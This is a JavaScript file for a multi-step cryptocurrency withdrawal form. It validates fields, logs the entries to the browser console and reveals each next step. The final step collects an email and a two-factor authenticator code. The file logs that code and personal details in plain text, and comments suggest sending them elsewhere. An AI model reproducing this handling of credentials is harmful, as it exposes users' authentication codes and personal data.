// Step 1: Withdraw Setup - Validate and Proceed to Step 2
function confirmStep1() {
  // Get values from the form fields
  const address = document.getElementById('withdrawalAddress').value.trim();
  const network = document.getElementById('network').value;
  const country = document.getElementById('country').value;
  const exchanger = document.getElementById('cryptoExchanger').value;

  // Check if all required fields are filled
  if (!address || !network || !country || !exchanger) {
    alert('Please complete all fields.');
    return; // Stop further execution if fields are empty
  }

  // Log values to console (for debugging purposes)
  console.log(`Withdrawal Address: ${address}`);
  console.log(`Network: ${network}`);
  console.log(`Country: ${country}`);
  console.log(`Crypto Exchanger: ${exchanger}`);

  // Hide the first step and show the second step
  document.getElementById('step1').style.display = 'none';
  document.getElementById('step2').style.display = 'block';
}

// Step 2: Receiver Information - Validate and Proceed to Step 3
function confirmStep2() {
  const receiver = document.getElementById('receiverAddress').value.trim();
  const name = document.getElementById('receiverName').value.trim();
  const surname = document.getElementById('receiverSurname').value.trim();
  const withdrawalReason = document.getElementById('withdrawalReason').value.trim();
  const sourceOfIncome = document.getElementById('sourceOfIncome').value;

  // Check that all fields are filled
  if (!receiver || !name || !surname || !withdrawalReason || !sourceOfIncome) {
    alert('Please complete all fields.');
    return;
  }

  // Log the values (or you can send them somewhere)
  console.log({
    receiverAddress: receiver,
    name: name,
    surname: surname,
    withdrawalReason: withdrawalReason,
    sourceOfIncome: sourceOfIncome,
  });

  // Move to the next step or perform other logic
  document.getElementById('step2').style.display = 'none';
  document.getElementById('step3').style.display = 'block';
}

// Step 3: Connect Your Wallet - Validate and Proceed to Final Step
function confirmStep3() {
  const email = document.getElementById('email').value.trim();
  const authenticator = document.getElementById('authenticatorCode').value.trim();

  // Check if all required fields are filled
  if (!email || !authenticator) {
    alert('Please complete all fields.');
    return;
  }

  // Log the values (or you can send them somewhere)
  console.log({
    email: email,
    authenticatorCode: authenticator,
  });

  // Hide the third step and show the final step
  document.getElementById('step3').style.display = 'none';
  document.getElementById('step4').style.display = 'block';
}

// Event listeners for button clicks to proceed to next step
document.getElementById('continueStep1').addEventListener('click', confirmStep1);
document.getElementById('continueStep2').addEventListener('click', confirmStep2);
document.getElementById('continueStep3').addEventListener('click', confirmStep3);
